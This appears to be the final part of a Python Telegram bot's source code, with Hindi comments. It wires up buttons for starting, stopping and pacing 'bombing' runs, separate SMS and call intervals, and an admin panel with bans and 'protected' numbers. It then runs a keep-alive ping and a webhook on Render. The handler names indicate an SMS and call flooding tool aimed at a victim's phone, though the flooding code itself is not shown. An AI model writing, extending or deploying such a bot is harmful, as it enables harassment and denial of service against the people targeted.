    app.add_handler(CallbackQueryHandler(stop_callback, pattern="^stop_bombing$"))
    app.add_handler(CallbackQueryHandler(speed_up_callback, pattern="^speed_up$"))
    app.add_handler(CallbackQueryHandler(speed_down_callback, pattern="^speed_down$"))
    app.add_handler(CallbackQueryHandler(stats_callback, pattern="^bombing_stats$"))
    app.add_handler(CallbackQueryHandler(admin_panel_callback, pattern="^admin_panel$"))
    app.add_handler(CallbackQueryHandler(admin_users_list, pattern="^admin_users_list$"))
    app.add_handler(CallbackQueryHandler(admin_ban_callback, pattern="^admin_ban$"))
    app.add_handler(CallbackQueryHandler(admin_unban_callback, pattern="^admin_unban$"))
    app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
    app.add_handler(CallbackQueryHandler(admin_lookup_callback, pattern="^admin_lookup$"))
    app.add_handler(CallbackQueryHandler(admin_addadmin_callback, pattern="^admin_addadmin$"))
    app.add_handler(CallbackQueryHandler(admin_removeadmin_callback, pattern="^admin_removeadmin$"))
    app.add_handler(CallbackQueryHandler(admin_protect_callback, pattern="^admin_protect$"))
    app.add_handler(CallbackQueryHandler(admin_unprotect_callback, pattern="^admin_unprotect$"))
    app.add_handler(CallbackQueryHandler(admin_list_protected_callback, pattern="^admin_list_protected$"))
    app.add_handler(CallbackQueryHandler(admin_set_intervals_callback, pattern="^admin_set_intervals$"))
    app.add_handler(CallbackQueryHandler(set_call_interval_callback, pattern="^set_call_interval$"))
    app.add_handler(CallbackQueryHandler(set_sms_interval_callback, pattern="^set_sms_interval$"))
    app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
    app.add_handler(CallbackQueryHandler(admin_dm_callback, pattern="^admin_dm$"))

    # मैसेज हैंडलर (सभी टेक्स्ट/मीडिया)
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))

    # सेल्फ-पिंग शुरू करें
    asyncio.create_task(keep_alive())

    # वेबहुक शुरू करें
    if RENDER_EXTERNAL_URL:
        webhook_url = f"{RENDER_EXTERNAL_URL}/webhook"
        logger.info(f"🚀 Webhook starting on {webhook_url}")
        await app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path="webhook",
            webhook_url=webhook_url
        )
    else:
        logger.error("❌ RENDER_EXTERNAL_URL not set!")
        return

if __name__ == "__main__":
    asyncio.run(main())
